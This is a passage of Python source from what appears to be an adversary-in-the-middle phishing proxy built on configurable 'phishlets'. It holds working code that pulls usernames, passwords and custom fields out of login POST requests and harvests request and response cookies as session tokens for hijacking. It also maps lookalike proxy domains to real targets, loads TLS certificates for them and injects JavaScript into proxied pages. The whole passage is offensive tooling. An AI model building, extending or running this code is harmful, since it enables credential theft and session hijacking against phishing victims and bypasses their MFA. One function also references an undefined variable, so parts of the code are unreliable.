                    new_rel = request.rel_url.path
                    if new_query_str:
                        new_rel = f"{new_rel}?{new_query_str}"
                    request['_modified_rel_url'] = new_rel
                    debug_log(f"Force GET modified URL to {new_rel}", "INFO")

    except Exception as e:
        debug_log(f"Error in force_get_data: {e}", "ERROR")

async def capture_form_data(request, session_cookie: str, phishlet_id: int, proxy_domain: str):
    """
    Capture form data from POST requests and update session based on phishlet credential configuration
    """
    try:
        if request.method == 'POST':
            # Get the request URL path to check against auth_urls
            request_path = str(request.rel_url)
            debug_log(f"Checking POST request to: {request_path}", "DEBUG")
            
            # Get phishlet data to check auth_urls and credentials configuration
            def _get_phishlet_credentials():
                from .models import Phishlet
                try:
                    phishlet = Phishlet.objects.get(id=phishlet_id)
                    return phishlet.data if isinstance(phishlet.data, dict) else {}
                except Phishlet.DoesNotExist:
                    return {}
            
            # Run in thread executor to avoid Django async issues
            import asyncio
            loop = asyncio.get_running_loop()
            phishlet_data = await loop.run_in_executor(None, _get_phishlet_credentials)
            
            # Check if this URL is in the auth_urls list
            auth_urls = phishlet_data.get('auth_urls', [])
            credentials_config = phishlet_data.get('credentials', [])
            
            if not auth_urls or not credentials_config:
                debug_log("No auth_urls or credentials configuration found", "DEBUG")
                return
            
            # Check if the current request path matches any auth_urls
            is_auth_url = False
            for auth_url in auth_urls:
                if auth_url.startswith('/') and request_path.startswith(auth_url):
                    is_auth_url = True
                    debug_log(f"Auth URL match found: {auth_url}", "INFO")
                    break
                elif auth_url == request_path:
                    is_auth_url = True
                    debug_log(f"Auth URL exact match: {auth_url}", "INFO")
                    break
            
            if not is_auth_url:
                debug_log(f"Not an auth URL, skipping credential capture", "DEBUG")
                return
            
            debug_log("🎯 🟢 AUTH URL DETECTED - ATTEMPTING CREDENTIAL CAPTURE", "INFO")
            
            # Parse request data based on content type
            captured_data = {}
            
            # Get the raw request body first to avoid consuming it multiple times
            request_body = await request.read()
            
            # Store the request body in the request object for later use in forwarding
            request['_body'] = request_body
            
            # Try to parse as form data
            form_data = {}
            try:
                # Parse form data manually from the request body
                import urllib.parse
                if request_body:
                    form_str = request_body.decode('utf-8')
                    form_data = dict(urllib.parse.parse_qsl(form_str))
                debug_log(f"Form data parsed: {form_data}", "DEBUG")
            except Exception as e:
                debug_log(f"Could not parse as form data: {e}", "DEBUG")
            
            # Try to parse as JSON if we need JSON data
            json_data = None
            if any(cred.get('type') == 'json' for cred in credentials_config):
                try:
                    import json
                    json_data = json.loads(request_body.decode('utf-8'))
                    debug_log(f"JSON data parsed: {json_data}", "DEBUG")
                except Exception as e:
                    debug_log(f"Could not parse as JSON: {e}", "DEBUG")
            
            # Process each credential configuration
            for cred_config in credentials_config:
                cred_type = cred_config.get('type', 'post')
                cred_name = cred_config.get('name', '')
                keyword = cred_config.get('keyword', '')
                use_regex = cred_config.get('regexp', 'false').lower() == 'true'
                regex_string = cred_config.get('regexp_string', '')
                
                debug_log(f"Processing credential: {cred_name} (type: {cred_type}, keyword: {keyword})", "DEBUG")
                
                captured_value = None
                
                if cred_type == 'json' and json_data:
                    # Handle JSON type credentials
                    if use_regex and regex_string:
                        try:
                            import re
                            # Search in the JSON string representation
                            json_str = json.dumps(json_data)
                            match = re.search(regex_string, json_str)
                            if match:
                                captured_value = match.group(1)
                                debug_log(f"🎯 🟢 REGEX MATCH FOUND for {cred_name}: {captured_value[:10]}...", "INFO")
                        except Exception as e:
                            debug_log(f"Regex error for {cred_name}: {e}", "ERROR")
                    else:
                        # Use keyword to find in JSON
                        if keyword in json_data:
                            captured_value = json_data[keyword]
                            debug_log(f"🎯 🟢 KEYWORD MATCH FOUND for {cred_name}: {captured_value[:10]}...", "INFO")
                
                elif cred_type == 'post' and form_data:
                    # Handle POST form credentials
                    if use_regex and regex_string:
                        try:
                            import re
                            # Search in form data
                            form_str = str(dict(form_data))
                            match = re.search(regex_string, form_str)
                            if match:
                                captured_value = match.group(1)
                                debug_log(f"🎯 🟢 REGEX MATCH FOUND for {cred_name}: {captured_value[:10]}...", "INFO")
                        except Exception as e:
                            debug_log(f"Regex error for {cred_name}: {e}", "ERROR")
                    else:
                        # Use keyword to find in form data
                        if keyword in form_data:
                            captured_value = form_data[keyword]
                            debug_log(f"🎯 🟢 KEYWORD MATCH FOUND for {cred_name}: {captured_value[:10]}...", "INFO")
                
                # Store captured value based on credential name
                if captured_value:
                    if cred_name.lower() in ['username', 'user', 'email', 'login']:
                        captured_data['captured_username'] = captured_value
                        debug_log(f"🎯 🟢 CAPTURED USERNAME: {captured_value[:10]}...", "INFO")
                    elif cred_name.lower() in ['password', 'pass', 'pwd']:
                        captured_data['captured_password'] = captured_value
                        debug_log(f"🎯 🟢 CAPTURED PASSWORD: {captured_value[:10]}...", "INFO")
                    else:
                        # Store in custom data
                        if 'captured_custom' not in captured_data:
                            captured_data['captured_custom'] = {}
                        captured_data['captured_custom'][cred_name] = captured_value
                        debug_log(f"🎯 🟢 CAPTURED CUSTOM DATA {cred_name}: {captured_value[:10]}...", "INFO")
            
            # Update session if we captured any data
            if captured_data:
                debug_log(f"🎯 🟢 SUCCESS: Updated session with captured data: {list(captured_data.keys())}", "INFO")
                await update_session_data(session_cookie, phishlet_id, proxy_domain, **captured_data)
            else:
                debug_log("⚠️  No credentials captured from this request", "DEBUG")
                
    except Exception as e:
        debug_log(f"Error capturing form data: {e}", "ERROR")
        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")

def _parse_cookie_metadata(cookie_name: str, cookie_value: str, host_domain: str) -> dict:
    """
    Parse cookie metadata and create detailed cookie object
    """
    debug_log(f"🔍 PARSING cookie metadata for '{cookie_name}' with proxy_domain: '{proxy_domain}'", "DEBUG")
    # host_domain = _get_target_host_from_routing(proxy_domain)
    debug_log(f"🔍 HOST DOMAIN: '{host_domain}'", "DEBUG")
    debug_log(f"🔍 PROXY DOMAIN: '{proxy_domain}'", "DEBUG")
    
    # Create detailed cookie object with minimal defaults - only set what's explicitly available
    cookie_info = {
        "name": cookie_name,
        "value": cookie_value,
        "domain": host_domain,  # REQUEST COOKIE DOMAIN SET TO PROXY_DOMAIN
        "hostOnly": True,  # Default to true for proxy cookies
        "path": None,  # Will be set by browser defaults
        "secure": None,  # Will be set by browser defaults
        "httpOnly": None,  # Will be set by browser defaults
        "sameSite": None,  # Will be set by browser defaults
        "session": False,  # Default to false (persistent cookies)
        "firstPartyDomain": "",
        "partitionKey": None,
        "expirationDate": None,  # We can't determine expiration from request
        "storeId": None
    }
    
    debug_log(f"🔍 REQUEST cookie domain set to proxy_domain: '{proxy_domain}' for cookie '{cookie_name}'", "DEBUG")
    
    # Only apply intelligent defaults for session flag based on cookie name
    if "session" in cookie_name.lower():
        cookie_info["session"] = True
    
    return cookie_info

async def capture_cookies(request, session_cookie: str, phishlet_id: int, proxy_domain: str):
    """
    Capture cookies from the request and update session with detailed metadata
    """
    try:
        cookies = request.cookies
        
        if cookies:
            # Filter out our own session cookie and capture detailed cookie info
            captured_cookies = []
            for name, value in cookies.items():
                if name != f'evilpunch_session_{phishlet_id}':
                    # Parse detailed cookie metadata
                    cookie_info = _parse_cookie_metadata(name, value, request.headers.get('Host', ''))
                    captured_cookies.append(cookie_info)
            
            if captured_cookies:
                await update_session_data(
                    session_cookie, 
                    phishlet_id, 
                    proxy_domain, 
                    captured_cookies=captured_cookies
                )
                debug_log(f"🎯 🟢 CAPTURED {len(captured_cookies)} COOKIES with detailed metadata", "INFO")
                for cookie in captured_cookies:
                    debug_log(f"   🍪 {cookie['name']}: {cookie['value'][:20]}... (domain: {cookie['domain']}, secure: {cookie['secure']})", "DEBUG")
                
    except Exception as e:
        debug_log(f"Error capturing cookies: {e}", "ERROR")
        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")

async def merge_cookies_to_session(session_cookie: str, phishlet_id: int, proxy_domain: str, new_cookies: list, source: str):
    """
    Merge new cookies with existing session cookies instead of replacing them.
    Preserves full cookie metadata and handles both dict and list formats.
    """
    try:
        def _merge_operation():
            from .models import Session
            
            try:
                session = Session.objects.get(
                    session_cookie=session_cookie,
                    phishlet_id=phishlet_id,
                    is_active=True
                )
                
                # Get existing cookies - handle both dict and list formats
                existing_cookies = session.captured_cookies or []
                
                # Ensure existing_cookies is a list
                if isinstance(existing_cookies, dict):
                    # Convert old dict format to list format
                    existing_cookies = list(existing_cookies.values())
                elif not isinstance(existing_cookies, list):
                    existing_cookies = []
                
                # Create a lookup dict for existing cookies by name
                existing_by_name = {}
                for cookie in existing_cookies:
                    if isinstance(cookie, dict) and 'name' in cookie:
                        existing_by_name[cookie['name']] = cookie
                
                # Merge new cookies with existing ones
                merged_cookies = existing_cookies.copy()
                added_count = 0
                updated_count = 0
                
                for new_cookie in new_cookies:
                    if not isinstance(new_cookie, dict) or 'name' not in new_cookie:
                        continue
                    
                    cookie_name = new_cookie['name']
                    new_cookie_domain = new_cookie.get('domain', 'N/A')
                    
                    debug_log(f"🔍 MERGING cookie '{cookie_name}' with domain '{new_cookie_domain}' from {source}", "DEBUG")
                    
                    if cookie_name in existing_by_name:
                        # Update existing cookie with new data
                        existing_cookie = existing_by_name[cookie_name]
                        existing_domain = existing_cookie.get('domain', 'N/A')
                        
                        debug_log(f"🔍 EXISTING cookie '{cookie_name}' has domain '{existing_domain}'", "DEBUG")
                        debug_log(f"🔍 NEW cookie '{cookie_name}' has domain '{new_cookie_domain}'", "DEBUG")
                        
                        # Merge metadata, preferring new values
                        merged_cookie = {**existing_cookie, **new_cookie}
                        merged_domain = merged_cookie.get('domain', 'N/A')
                        
                        debug_log(f"🔍 MERGED cookie '{cookie_name}' final domain: '{merged_domain}'", "DEBUG")
                        
                        # Find and replace in the list
                        for i, cookie in enumerate(merged_cookies):
                            if isinstance(cookie, dict) and cookie.get('name') == cookie_name:
                                merged_cookies[i] = merged_cookie
                                break
                        
                        existing_by_name[cookie_name] = merged_cookie
                        updated_count += 1
                        debug_log(f"🍪 UPDATED cookie '{cookie_name}' from {source} (domain: '{existing_domain}' -> '{merged_domain}')", "DEBUG")
                    else:
                        # Add new cookie
                        merged_cookies.append(new_cookie)
                        existing_by_name[cookie_name] = new_cookie
                        added_count += 1
                        debug_log(f"🍪 ADDED new cookie '{cookie_name}' from {source} (domain: '{new_cookie_domain}')", "DEBUG")
                
                # Update the session with merged cookies
                session.captured_cookies = merged_cookies
                session.is_captured = session.has_captured_data()
                session.save(update_fields=['captured_cookies', 'is_captured'])
                
                total_count = len(merged_cookies)
                debug_log(f"🍪 MERGED {added_count} new + {updated_count} updated cookies from {source} into session (total: {total_count})", "DEBUG")
                
                # Log cookie details for debugging
                for cookie in merged_cookies:
                    if isinstance(cookie, dict) and 'name' in cookie:
                        debug_log(f"   🍪 {cookie['name']}: {cookie.get('value', '')[:20]}... (domain: {cookie.get('domain', 'N/A')}, secure: {cookie.get('secure', False)})", "DEBUG")
                
            except Session.DoesNotExist:
                debug_log(f"Session {session_cookie[:8]}... not found for cookie merge", "WARN")
                
        # Run in thread executor to avoid Django async issues
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, _merge_operation)
        
    except Exception as e:
        debug_log(f"Error merging cookies to session: {e}", "ERROR")
        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")

async def capture_response_cookies(response_headers, session_cookie: str, phishlet_id: int, proxy_domain: str, host_domain: str):
    """
    Capture cookies from response Set-Cookie headers and update session with detailed metadata.
    """
    try:
        
        # Check for Set-Cookie headers in response
        set_cookie_headers = response_headers.getall('Set-Cookie', [])
        
        if set_cookie_headers:
            # Get phishlet data
            def _get_phishlet_data():
                from .models import Phishlet
                try:
                    phishlet = Phishlet.objects.get(id=phishlet_id)
                    return phishlet.data if phishlet.data else {}
                except Phishlet.DoesNotExist:
                    return {}
            
            loop = asyncio.get_running_loop()
            phishlet_data = await loop.run_in_executor(None, _get_phishlet_data)
            
            captured_cookies = []
            for set_cookie_header in set_cookie_headers:
                try:
                    debug_log(f"🔍 PROCESSING response Set-Cookie header: '{set_cookie_header}'", "DEBUG")
                    
                    # Parse Set-Cookie header to extract detailed cookie metadata
                    cookie_info = _parse_set_cookie_header(set_cookie_header, proxy_domain, host_domain)
                    
                    debug_log(f"🔍 Parsed cookie_info domain: '{cookie_info['domain']}' for cookie '{cookie_info['name']}'", "DEBUG")
                    
                    # Filter out our own session cookie
                    if cookie_info['name'] != f'evilpunch_session_{phishlet_id}':
                        debug_log(f"🔍 Adding cookie '{cookie_info['name']}' with domain '{cookie_info['domain']}'", "DEBUG")
                        
                        captured_cookies.append(cookie_info)
                    else:
                        debug_log(f"🔍 Filtered out evilpunch session cookie: '{cookie_info['name']}'", "DEBUG")
                        
                except Exception as cookie_error:
                    debug_log(f"Error parsing Set-Cookie header '{set_cookie_header}': {cookie_error}", "WARN")
                    continue
            
            if captured_cookies:
                await merge_cookies_to_session(session_cookie, phishlet_id, proxy_domain, captured_cookies, "response")
                debug_log(f"🎯 🟢 CAPTURED {len(captured_cookies)} COOKIES from response with detailed metadata", "INFO")
                for cookie in captured_cookies:
                    debug_log(f"   🍪 {cookie['name']}: {cookie['value'][:20]}... (domain: {cookie['domain']}, secure: {cookie['secure']}, httpOnly: {cookie['httpOnly']})", "DEBUG")
                
    except Exception as e:
        debug_log(f"Error capturing cookies from response: {e}", "ERROR")
        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")

# --- END SESSION MANAGEMENT ---

def _parse_set_cookie_header(set_cookie_header: str, proxy_domain: str, host_domain: str) -> dict:
    """
    Parse Set-Cookie header to extract detailed cookie metadata
    Example: "sessionId=abc123; Domain=.example.com; Path=/; Secure; HttpOnly; SameSite=Strict"
    """
    try:
        # debug_log(f"🔍⛑🐯🐱 PARSING Set-Cookie header: '{set_cookie_header}' with proxy_domain: '{proxy_domain}'", "DEBUG")
        
        # Split the header into parts
        parts = set_cookie_header.split(';')
        cookie_part = parts[0].strip()
        
        # Extract name and value
        if '=' in cookie_part:
            name, value = cookie_part.split('=', 1)
        else:
            name, value = cookie_part, ""
        
        debug_log(f"🔍🐯🐱 Extracted cookie name: '{name.strip()}', value: '{value.strip()}'", "DEBUG")
        
        #  default domain should be hosts to proxy domain corespnds to current proxy domain
        default_domain = _get_target_host_from_routing(host_domain)
        # Initialize cookie info with minimal defaults - only set what's explicitly in the header
        cookie_info = {
            "name": name.strip(),
            "value": value.strip(),
            "domain": default_domain,  # INITIAL DOMAIN SET TO PROXY_DOMAIN
            "hostOnly": True,  # Will be updated if Domain attribute is present
            "path": None,  # Will be set if Path attribute is present
            "secure": None,  # Will be set if Secure attribute is present
            "httpOnly": None,  # Will be set if HttpOnly attribute is present
            "sameSite": None,  # Will be set if SameSite attribute is present
            "session": False,
            "firstPartyDomain": "",
            "partitionKey": None,
            "expirationDate": None,
            "storeId": None
        }
        
        debug_log(f"🔍 INITIAL cookie domain set to proxy_domain: '{proxy_domain}'", "DEBUG")
        
        # Parse attributes
        for part in parts[1:]:
            part = part.strip()
            if '=' in part:
                attr_name, attr_value = part.split('=', 1)
                attr_name = attr_name.strip().lower()
                attr_value = attr_value.strip()
                
                debug_log(f"🔍 Processing attribute: '{attr_name}' = '{attr_value}'", "DEBUG")
                
                if attr_name == 'domain':
                    old_domain = cookie_info['domain']
                    cookie_info['domain'] = attr_value
                    cookie_info['hostOnly'] = False
                    debug_log(f"🔍 DOMAIN ATTRIBUTE FOUND! Changed domain from '{old_domain}' to '{attr_value}'", "DEBUG")
                elif attr_name == 'path':
                    cookie_info['path'] = attr_value
                elif attr_name == 'samesite':
                    # Handle sameSite attribute properly
                    if attr_value.lower() == 'none':
                        cookie_info['sameSite'] = None
                    else:
                        cookie_info['sameSite'] = attr_value.lower()
                elif attr_name == 'expires':
                    # Try to parse expiration date
                    try:
                        import time
                        from email.utils import parsedate_to_datetime
                        parsed_date = parsedate_to_datetime(attr_value)
                        cookie_info['expirationDate'] = int(parsed_date.timestamp())
                    except:
                        pass
                elif attr_name == 'max-age':
                    try:
                        import time
                        max_age = int(attr_value)
                        cookie_info['expirationDate'] = int(time.time()) + max_age
                    except:
                        pass
            else:
                # Boolean attributes
                attr_name = part.lower()
                if attr_name == 'secure':
                    cookie_info['secure'] = True
                elif attr_name == 'httponly':
                    cookie_info['httpOnly'] = True
                elif attr_name == 'session':
                    cookie_info['session'] = True
        
        debug_log(f"🔍 FINAL parsed cookie domain: '{cookie_info['domain']}' for cookie '{cookie_info['name']}'", "DEBUG")
        
        # Only apply intelligent defaults for session flag based on cookie name
        if "session" in cookie_info['name'].lower():
            cookie_info['session'] = True
        
        return cookie_info
        
    except Exception as e:
        # Fallback to basic parsing
        return _parse_cookie_metadata(name, value, host_domain)

def _normalize_hostname(host: str) -> str:
    try:
        # strip port if present and lowercase
        hostname = host.split(":")[0].strip().lower()
        debug_log(f"Normalized hostname: '{host}' -> '{hostname}'", "DEBUG")
        return hostname
    except Exception as e:
        debug_log(f"Error normalizing hostname '{host}': {e}", "WARN")
        return host.strip().lower()


def _is_wildcard_domain_match(pattern: str, hostname: str) -> bool:
    """
    Check if a hostname matches a wildcard domain pattern.
    
    Args:
        pattern: The wildcard pattern (e.g., '.xx.in', '*.xx.in', 'xx.in')
        hostname: The hostname to check (e.g., 'login.xx.in', 'api.xx.in')
    
    Returns:
        bool: True if the hostname matches the pattern
    
    Examples:
        _is_wildcard_domain_match('.xx.in', 'login.xx.in') -> True
        _is_wildcard_domain_match('.xx.in', 'api.xx.in') -> True
        _is_wildcard_domain_match('.xx.in', 'xx.in') -> True
        _is_wildcard_domain_match('.xx.in', 'evil.com') -> False
    """
    try:
        # Normalize both inputs
        pattern = pattern.strip().lower()
        hostname = hostname.strip().lower()
        
        # Handle different wildcard formats
        if pattern.startswith('.'):
            # Pattern like '.xx.in' - matches all subdomains and the base domain
            base_domain = pattern[1:]  # Remove the leading dot
            return hostname == base_domain or hostname.endswith('.' + base_domain)
        elif pattern.startswith('*.'):
            # Pattern like '*.xx.in' - matches all subdomains but not the base domain
            base_domain = pattern[2:]  # Remove the '*.'
            return hostname.endswith('.' + base_domain)
        elif '*' in pattern:
            # Pattern like '*.xx.in' (already handled above, but just in case)
            base_domain = pattern.split('*', 1)[1]
            if base_domain.startswith('.'):
                base_domain = base_domain[1:]
            return hostname.endswith('.' + base_domain)
        else:
            # No wildcard - exact match
            return hostname == pattern
            
    except Exception as e:
        debug_log(f"Error in wildcard domain matching: {e}", "ERROR")
        return False


def _get_target_host_from_routing(incoming_host: str) -> str:
    """
    Get the target host from the routing table, handling wildcard domain matching.
    
    Args:
        incoming_host: The incoming hostname to match
        
    Returns:
        str: The target host if found, None otherwise
    """
    try:
        # First try exact match
        if incoming_host in _routing_table:
            return _routing_table[incoming_host]
        
        # Then try wildcard matching
        for route_key, target_host in _routing_table.items():
            if route_key.startswith("WILDCARD:"):
                wildcard_pattern = route_key[9:]  # Remove "WILDCARD:" prefix
                if _is_wildcard_domain_match(wildcard_pattern, incoming_host):
                    debug_log(f"Wildcard match: '{incoming_host}' matches pattern '{wildcard_pattern}' -> '{target_host}'", "DEBUG")
                    return target_host
        
        return None
        
    except Exception as e:
        debug_log(f"Error in routing lookup: {e}", "ERROR")
        return None


def _ensure_runtime_cert_dir() -> Path:
    global _runtime_cert_dir
    if _runtime_cert_dir is None:
        run_dir = Path(BASE_DIR) / "runtime_certs"
        debug_log(f"Creating runtime cert directory: {run_dir}", "DEBUG")
        run_dir.mkdir(parents=True, exist_ok=True)
        _runtime_cert_dir = run_dir
        debug_log(f"Runtime cert directory ready: {_runtime_cert_dir}", "DEBUG")
    return _runtime_cert_dir


def _write_cert_files(hostname: str, cert_pem: str, key_pem: str) -> Tuple[Path, Path]:
    cert_dir = _ensure_runtime_cert_dir()
    safe_host = hostname.replace("*", "wildcard").replace("/", "_")
    cert_path = cert_dir / f"{safe_host}.cert.pem"
    key_path = cert_dir / f"{safe_host}.key.pem"
    
    debug_log(f"Writing certificate files for {hostname}", "DEBUG")
    debug_log(f"  Cert path: {cert_path}", "DEBUG")
    debug_log(f"  Key path: {key_path}", "DEBUG")
    
    cert_path.write_text(cert_pem, encoding="utf-8")
    key_path.write_text(key_pem, encoding="utf-8")
    
    debug_log(f"✓ Certificate files written successfully", "DEBUG")
    return cert_path, key_path


def _check_js_injection_match(phishlet_data: dict, incoming_host: str, request_path: str) -> List[dict]:
    """
    Check if the current request matches any inject_js criteria in the phishlet.
    Returns a list of matching inject_js entries.
    """
    inject_js_list = phishlet_data.get('inject_js', [])
    if not inject_js_list:
        return []
    
    matching_injections = []
    
    # Build a mapping of target hosts to proxy hosts for this phishlet
    target_to_proxy_mapping = {}
    hosts_to_proxy = phishlet_data.get('hosts_to_proxy', [])
    proxy_domain = phishlet_data.get('proxy_domain', '')
    
    for entry in hosts_to_proxy:
        if isinstance(entry, dict):
            target_host = entry.get('host', '').strip().lower()
            proxy_sub = entry.get('proxy_subdomain', '').strip()
            
            if target_host and proxy_domain:
                # Build the proxy hostname
                if proxy_sub:
                    proxy_host = f"{proxy_sub}.{proxy_domain}"
                else:
                    proxy_host = proxy_domain
                
                target_to_proxy_mapping[target_host] = proxy_host
                debug_log(f"JS injection mapping: {target_host} -> {proxy_host}", "DEBUG")
    
    debug_log(f"JS injection host mappings: {target_to_proxy_mapping}", "DEBUG")
    
    for injection in inject_js_list:
        if not isinstance(injection, dict):
            continue
            
        target_host_match = injection.get('host', '').strip().lower()
        url_pattern = injection.get('url', '').strip()
        js_code = injection.get('js_code', '')
        
        if not target_host_match or not url_pattern or not js_code:
            continue
        
        # Check if this target host maps to our incoming proxy host
        proxy_host_for_target = target_to_proxy_mapping.get(target_host_match)
        if not proxy_host_for_target:
            debug_log(f"JS injection: no proxy mapping found for target host {target_host_match}", "DEBUG")
            continue
        
        # Check if incoming host matches the proxy host for this target
        if proxy_host_for_target.lower() != incoming_host.lower():
            debug_log(f"JS injection: host mismatch - expected {proxy_host_for_target}, got {incoming_host}", "DEBUG")
            continue
        
        # Check URL pattern match
        if url_pattern == '*':
            # Wildcard - matches all paths
            url_matches = True
        elif url_pattern.endswith('/*'):
            # Prefix match
            prefix = url_pattern[:-2]
            url_matches = request_path.startswith(prefix)
        elif url_pattern.startswith('/') and url_pattern.endswith('/*'):
            # Path prefix match
            prefix = url_pattern[1:-2]
            url_matches = request_path.startswith(prefix)
        else:
            # Exact path match
            url_matches = request_path == url_pattern
        
        if url_matches:
            matching_injections.append(injection)
            debug_log(f"✓ JS injection match: target_host={target_host_match}, proxy_host={proxy_host_for_target}, url={url_pattern}, path={request_path}", "INFO")
    
    return matching_injections


def _create_temp_js_endpoint(js_code: str) -> str:
    """
    Create a temporary endpoint to serve JavaScript code.
    Returns the endpoint ID that can be used in script tags.
    """
    import secrets
    
    endpoint_id = f"js_{secrets.token_urlsafe(16)}"
    _temp_js_endpoints[endpoint_id] = js_code
    
    debug_log(f"Created temp JS endpoint: {endpoint_id}", "DEBUG")
    return endpoint_id


def _build_routing_from_active_phishlets() -> Dict[str, str]:
    """
    Build mapping of proxy host -> target host from all active phishlets.
    Uses 'proxy_domain' and each entry in 'hosts_to_proxy' to compute proxy hostnames.
    """
    mapping: Dict[str, str] = {}
    debug_log("=== BUILDING ROUTING FROM ACTIVE PHISHLETS ===", "DEBUG")
    
    try:
        from .models import Phishlet  # type: ignore
        active_phishlets = Phishlet.objects.filter(is_active=True)
        debug_log(f"Found {active_phishlets.count()} active phishlets", "INFO")
        
        for phishlet in active_phishlets:
            debug_log(f"Processing phishlet ID: {phishlet.id}", "DEBUG")
            data = phishlet.data if isinstance(phishlet.data, dict) else {}
            proxy_domain = str(data.get("proxy_domain", "")).strip().lower()
            hosts_list = data.get("hosts_to_proxy") or []
            
            debug_log(f"  Proxy domain: '{proxy_domain}'", "DEBUG")
            debug_log(f"  Hosts to proxy: {hosts_list}", "DEBUG")
            
            if not proxy_domain or not isinstance(hosts_list, list):
                debug_log(f"  Skipping - invalid proxy_domain or hosts_list", "WARN")
                # Try to fallback to target_url if present
                target_url = data.get("target_url")
                if isinstance(target_url, str) and proxy_domain:
                    try:
                        target_host = urlparse(target_url).hostname or ""
                        if target_host:
                            mapping[proxy_domain] = target_host
                            debug_log(f"  Fallback mapping: {proxy_domain} -> {target_host}", "INFO")
                    except Exception as e:
                        debug_log(f"  Fallback parsing failed: {e}", "ERROR")
                continue

            for i, entry in enumerate(hosts_list):
                debug_log(f"  Processing entry {i+1}: {entry}", "DEBUG")
                if not isinstance(entry, dict):
                    debug_log(f"    Skipping - not a dict", "WARN")
                    continue
                    
                target_host = str(entry.get("host", "")).strip().lower()
                # Prefer explicit proxy_subdomain, otherwise fall back to original_subdomain/orignal_subdomain
                proxy_sub_raw = entry.get("proxy_subdomain")
                if not (isinstance(proxy_sub_raw, str) and proxy_sub_raw.strip()):
                    proxy_sub_raw = entry.get("original_subdomain") or entry.get("orignal_subdomain") or ""
                proxy_sub = str(proxy_sub_raw or "").strip().lower()
                
                debug_log(f"    Target host: '{target_host}'", "DEBUG")
                debug_log(f"    Proxy subdomain: '{proxy_sub}'", "DEBUG")
                
                if not target_host:
                    debug_log(f"    Skipping - no target host", "WARN")
                    continue
                    
                proxy_host = proxy_domain if not proxy_sub else f"{proxy_sub}.{proxy_domain}"
                normalized_proxy = _normalize_hostname(proxy_host)
                normalized_target = _normalize_hostname(target_host)
                
                # For wildcard domains, we need to handle them specially in the mapping
                if proxy_domain.startswith('.') or '*' in proxy_domain:
                    # Store the wildcard pattern for later matching
                    mapping[f"WILDCARD:{proxy_domain}"] = normalized_target
                else:
                    mapping[normalized_proxy] = normalized_target
                debug_log(f"    ✓ Added mapping: {normalized_proxy} -> {normalized_target}", "INFO")
                
                # Add reverse mapping for subdomain replacement
                # This ensures that when someone visits xx.in, login.fluxxset.com gets replaced with login1.xx.in
                if proxy_sub and target_host != proxy_domain:
                    # Create the subdomain target host (e.g., login.fluxxset.com)
                    target_subdomain = target_host.split('.')[0] if '.' in target_host else ""
                    if target_subdomain and target_subdomain != proxy_sub:
                        subdomain_target = f"{target_subdomain}.{target_host.split('.', 1)[1]}" if '.' in target_host else target_host
                        # Add this to the reverse routing table later
                        debug_log(f"    Will add reverse mapping: {subdomain_target} -> {proxy_host}", "DEBUG")
                        
    except Exception as e:
        debug_log(f"Failed to build routing from phishlets: {e}", "ERROR")
        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
        
    debug_log(f"Final routing mapping: {mapping}", "DEBUG")
    debug_log("=== END BUILDING ROUTING ===", "DEBUG")
    return mapping


def _get_active_proxy_hosts_from_db() -> List[str]:
    hosts: List[str] = []
    debug_log("Getting active proxy hosts from database...", "DEBUG")
    try:
        from .models import ProxyDomain  # type: ignore
        for d in ProxyDomain.objects.filter(is_active=True):
            hostname = _normalize_hostname(d.hostname)
            hosts.append(hostname)
            debug_log(f"  Found active domain: {hostname}", "DEBUG")
    except Exception as e:
        debug_log(f"Error getting proxy hosts from DB: {e}", "ERROR")
        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
    
    debug_log(f"Total active proxy hosts from DB: {len(hosts)}", "INFO")
    return hosts


def _get_proxy_hosts_from_config() -> List[str]:
    hosts: List[str] = []
    debug_log("Getting proxy hosts from configuration...", "DEBUG")
    try:
        from .config import get_config  # type: ignore
        cfg = get_config()
        for h in cfg.get("proxy_domains", []) or []:
            if isinstance(h, str) and h.strip():
                hostname = _normalize_hostname(h)
                hosts.append(hostname)
                debug_log(f"  Found config domain: {hostname}", "DEBUG")
    except Exception as e:
        debug_log(f"Error getting proxy hosts from config: {e}", "ERROR")
        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
    
    debug_log(f"Total proxy hosts from config: {len(hosts)}", "INFO")
    return hosts


def _load_sni_contexts() -> Tuple[Optional[ssl.SSLContext], Dict[str, ssl.SSLContext]]:
    """
    Create a base SSLContext and domain-specific contexts for SNI using
    certificates stored in the database. Falls back to default cert files if no DB certs.
    Returns (base_context_or_none, per_host_contexts).
    """
    per_host: Dict[str, ssl.SSLContext] = {}
    base_context: Optional[ssl.SSLContext] = None
    
    debug_log("=== LOADING SSL SNI CONTEXTS ===", "DEBUG")

    try:
        from .models import ProxyDomain  # type: ignore
        # Gather active domains that have certificates
        domains = (
            ProxyDomain.objects.filter(is_active=True)
            .select_related("certificate")
        )
        
        debug_log(f"Found {domains.count()} active proxy domains", "INFO")

        first_loaded: Optional[Tuple[str, Path, Path]] = None
        for d in domains:
            debug_log(f"Processing domain: {d.hostname}", "DEBUG")
            cert = getattr(d, "certificate", None)
            if not cert:
                debug_log(f"  No certificate found", "WARN")
                continue
                
            cert_pem = getattr(cert, "cert_pem", "") or ""
            key_pem = getattr(cert, "key_pem", "") or ""
            
            debug_log(f"  Cert length: {len(cert_pem)} chars", "DEBUG")
            debug_log(f"  Key length: {len(key_pem)} chars", "DEBUG")
            
            if not cert_pem.strip() or not key_pem.strip():
                debug_log(f"  Empty cert or key, skipping", "WARN")
                continue
                
            try:
                cert_path, key_path = _write_cert_files(d.hostname, cert_pem, key_pem)
                debug_log(f"  Wrote cert files: {cert_path}, {key_path}", "DEBUG")
                
                ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                ctx.load_cert_chain(str(cert_path), str(key_path))
                normalized_host = _normalize_hostname(d.hostname)
                per_host[normalized_host] = ctx
                
                debug_log(f"  ✓ Successfully loaded SSL context for {normalized_host}", "INFO")
                
                if first_loaded is None:
                    first_loaded = (d.hostname, cert_path, key_path)
                    debug_log(f"  Set as first loaded (base context)", "DEBUG")
                    
            except Exception as e:
                debug_log(f"  Failed to load certificate for {d.hostname}: {e}", "ERROR")
                debug_log(f"  Traceback: {traceback.format_exc()}", "DEBUG")

        # Build base context
        if first_loaded is not None:
